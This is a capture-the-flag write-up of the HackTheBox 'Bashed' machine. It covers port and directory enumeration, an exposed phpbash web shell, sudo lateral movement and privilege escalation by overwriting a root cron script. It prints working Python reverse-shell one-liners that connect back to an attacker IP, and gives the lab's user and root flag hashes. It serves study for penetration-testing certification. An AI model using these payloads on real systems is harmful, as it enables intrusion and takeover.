# Bashed | HackTheBox Writeup

**OS:** Linux | **Difficulty:** Easy | **Rooted:** 2026-05-02

**Techniques:** phpbash web shell, sudo lateral move to scriptmanager, cron script overwrite to root

---

## Overview

Bashed is an Easy Linux box where the developer left phpbash, a PHP web shell, on the server while building the tool. Directory enumeration exposes it under `/dev/`. The web shell runs as www-data, which has sudo rights to run any command as scriptmanager. Scriptmanager owns a Python script that root executes on a cron schedule. Overwriting the script with a reverse shell payload lands a root shell when cron fires.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 1000 -oN bashed-all-ports.txt 10.129.27.55
ports=$(grep open bashed-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p $ports -sC -sV --min-rate 1000 -oN bashed-service-scan.txt 10.129.27.55
```

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache httpd 2.4.18 |

### Web Enumeration

```bash
gobuster dir -u http://10.129.27.55 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -o bashed-gobuster.txt
```

Key finding: `/dev/` with directory listing enabled, containing `phpbash.php`.

Homepage confirmed phpbash was developed on this exact server.

---

## Foothold

### phpbash Web Shell

```
http://10.129.27.55/dev/phpbash.php
```

Interactive web shell as `www-data`. sudo -l revealed:

```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Upgraded to reverse shell for stable interactive session:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.67",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## Lateral Movement

```bash
sudo -u scriptmanager /bin/bash
cat /home/arrexel/user.txt
# 8c8dd22e4f1f8cce5a9c9ffced522cfe
```

---

## Privilege Escalation

### Cron Script Overwrite

```bash
ls -la /scripts/
```

`test.py` owned by scriptmanager. `test.txt` owned by root with fresh timestamp. Root executes `test.py` via cron.

Overwrote test.py with reverse shell:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.67",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /scripts/test.py
```

Root shell landed when cron fired.

```bash
cat /root/root.txt
# 1efe6023b939ae47d2b706861c0c747c
```

---

## Attack Chain

```
Gobuster: /dev/ found with directory listing
    -> phpbash.php: web shell as www-data
        -> sudo -u scriptmanager: lateral move
            -> /scripts/test.py: writable, executed by root via cron
                -> payload overwrite: root shell
```

---

## Key Takeaways

- Dev tools left on servers are direct footholds. Always enumerate thoroughly for debug panels, dev directories, and admin interfaces.
- sudo lateral movement to another user can unlock a privesc path that was not accessible from the original user.
- Cron detection without crontab access: look for files owned by root in directories owned by your user. Fresh timestamps on root-owned output files confirm scheduled execution.
- Always upgrade a web shell to a reverse shell for stable interactive access before attempting lateral movement or privesc.

---

## Screenshots

| Step | File |
|------|------|
| Nmap all ports | `screenshots/01-all-ports.png` |
| Nmap service scan | `screenshots/02-service-scan.png` |
| Arrexel site | `screenshots/03-arrexel-site.png` |
| Site contents 1 | `screenshots/04-site-contents-1.png` |
| Site contents 2 | `screenshots/04-site-contents-2.png` |
| Gobuster enumeration | `screenshots/05-gobuster-enum.png` |
| Dev directory listing | `screenshots/06-dev-dir.png` |
| Uploads directory | `screenshots/07-uploads-dir.png` |
| Web shell | `screenshots/08-web-shell.png` |
| Reverse shell and upgrade | `screenshots/09-reverse-shell-and-upgrade.png` |
| User flag | `screenshots/10-user-flag.png` |
| Scriptmanager owns scripts | `screenshots/11-scriptmanager-owns.png` |
| Payload overwrite | `screenshots/12-payload-overwrite.png` |
| Root flag | `screenshots/13-root-flag.png` |

---

*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo. TJ Null HTB list, Linux Phase L1.*
